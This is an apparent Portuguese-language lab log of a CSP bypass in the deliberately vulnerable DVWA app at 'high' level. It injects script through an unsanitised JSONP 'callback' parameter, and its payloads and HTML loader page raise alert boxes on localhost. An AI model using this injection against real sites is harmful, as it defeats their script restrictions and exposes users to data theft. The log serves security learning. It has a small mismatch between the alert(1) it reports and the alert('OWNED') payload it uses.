# DVWA - CSP Bypass (High) — Diário de Execução

## Contexto

O objetivo foi explorar o bypass de Content Security Policy (CSP) no nível HIGH do DVWA.

A aplicação utiliza CSP para restringir a execução de scripts, porém implementa um endpoint JSONP vulnerável.

---

## Funcionamento da aplicação

A página realiza uma requisição para:

```
/vulnerabilities/csp/source/jsonp.php?callback=solveSum
```

Esse endpoint retorna JavaScript no formato JSONP:

```javascript
solveSum({"answer":"15"})
```

---

## Problema identificado

O parâmetro `callback` é controlado pelo usuário:

```
?callback=...
```

E é refletido diretamente na resposta:

```javascript
callback({...})
```

---

## Vulnerabilidade

Não há sanitização adequada do parâmetro `callback`.

Isso permite injeção de código JavaScript.

---

## Tentativa inicial

Payload:

```
?callback=foo);alert(1);//
```

Resposta:

```javascript
foo);alert(1);//({"answer":"15"})
```

---

## Problema encontrado

Ao acessar diretamente no navegador:

```
SyntaxError: JSON.parse
```

---

## Análise

O erro ocorre porque:

- o navegador tenta interpretar como JSON
- JSONP só executa corretamente quando carregado via `<script>`

---

## Exploração correta

Criar um arquivo HTML:

```html
<!DOCTYPE html>
<html>
<body>

<script src="http://localhost:8080/vulnerabilities/csp/source/jsonp.php?callback=alert('OWNED');//"></script>

</body>
</html>
```

---

## Execução

1. Abrir o arquivo no navegador
2. O script é carregado automaticamente
3. O payload é executado

---

## Resultado

```javascript
alert(1)
```

executado com sucesso

---

## Prova técnica

O navegador interpreta a resposta como JavaScript:

```javascript
alert('OWNED');//({"answer":"15"})
```

Executando:

- execução do payload (`alert('OWNED)`)
- comentário do restante (`//`)

---

## Por que a CSP falhou

A política permite scripts do próprio domínio:

```
script-src 'self'
```

Como o JSONP vem do mesmo domínio:

```
localhost:8080
```

o script é considerado confiável.

---

## Impacto

- execução de JavaScript arbitrário
- bypass completo da CSP
- possibilidade de roubo de dados e manipulação da aplicação

---

## Conclusão técnica

A aplicação utiliza JSONP sem validar o parâmetro `callback`, permitindo injeção de código.

Como a CSP confia no próprio domínio, o código malicioso é executado sem bloqueio.

---

## Conclusão final

Mesmo com CSP ativada, a presença de JSONP vulnerável permite bypass completo da proteção.

Isso demonstra que CSP não substitui validação adequada de entrada.
